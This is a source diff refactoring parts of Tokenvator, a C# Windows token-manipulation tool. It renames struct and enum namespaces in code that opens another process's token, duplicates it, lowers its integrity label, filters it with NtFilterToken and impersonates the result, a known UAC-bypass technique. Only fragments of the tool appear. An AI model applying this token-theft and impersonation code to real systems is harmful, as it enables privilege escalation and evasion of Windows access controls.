@@ -1,12 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
 using System.Linq;
-using System.Management;
 using System.Runtime.InteropServices;
-using System.Security;
 using System.Security.Principal;
-using System.Text;
+
+using Unmanaged.Headers;
+using Unmanaged.Libraries;
 
 namespace Tokenvator
 {
@@ -65,7 +63,7 @@ namespace Tokenvator
             Console.WriteLine("[+] Recieved Handle for: {0}", processId);
             Console.WriteLine(" [+] Process Handle: {0}", hProcess.ToInt32());
 
-            if (!kernel32.OpenProcessToken(hProcess, (UInt32)Enums.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
+            if (!kernel32.OpenProcessToken(hProcess, (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, out hExistingToken))
             {
                 Console.WriteLine(" [-] Unable to Open Process Token: {0}", hProcess.ToInt32());
                 return false;
@@ -73,13 +71,13 @@ namespace Tokenvator
             Console.WriteLine(" [+] Primary Token Handle: {0}", hExistingToken.ToInt32());
             kernel32.CloseHandle(hProcess);
 
-            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
+            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
             if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
                         (UInt32)(Constants.TOKEN_ALL_ACCESS),
                         ref securityAttributes,
-                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        Enums.TOKEN_TYPE.TokenPrimary,
+                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                        Winnt.TOKEN_TYPE.TokenPrimary,
                         out phNewToken
             ))
             {
@@ -96,7 +94,7 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         public Boolean SetTokenInformation()
         {
-            Structs.SidIdentifierAuthority pIdentifierAuthority = new Structs.SidIdentifierAuthority();
+            Winnt._SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new Winnt._SID_IDENTIFIER_AUTHORITY();
             pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
             byte nSubAuthorityCount = 1;
             IntPtr pSID = new IntPtr();
@@ -108,11 +106,11 @@ namespace Tokenvator
 
             Console.WriteLine(" [+] Initialized SID : {0}", pSID.ToInt32());
 
-            Structs.SID_AND_ATTRIBUTES sidAndAttributes = new Structs.SID_AND_ATTRIBUTES();
+            Winnt._SID_AND_ATTRIBUTES sidAndAttributes = new Winnt._SID_AND_ATTRIBUTES();
             sidAndAttributes.Sid = pSID;
             sidAndAttributes.Attributes = Constants.SE_GROUP_INTEGRITY_32;
 
-            Structs.TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Structs.TOKEN_MANDATORY_LABEL();
+            Winnt._TOKEN_MANDATORY_LABEL tokenMandatoryLabel = new Winnt._TOKEN_MANDATORY_LABEL();
             tokenMandatoryLabel.Label = sidAndAttributes;
             Int32 tokenMandatoryLableSize = Marshal.SizeOf(tokenMandatoryLabel);
             
@@ -123,7 +121,6 @@ namespace Tokenvator
             }
             Console.WriteLine(" [+] Set Token Information : {0}", phNewToken.ToInt32());
 
-            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
             if (0 != ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken))
             {
                 GetError("NtFilterToken: ");
@@ -137,13 +134,13 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         public Boolean ImpersonateUser()
         {
-            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
+            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
             if (!advapi32.DuplicateTokenEx(
                         luaToken,
                         (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
                         ref securityAttributes,
-                        Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        Enums.TOKEN_TYPE.TokenImpersonation,
+                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                        Winnt.TOKEN_TYPE.TokenImpersonation,
                         out phNewToken
             ))
             {
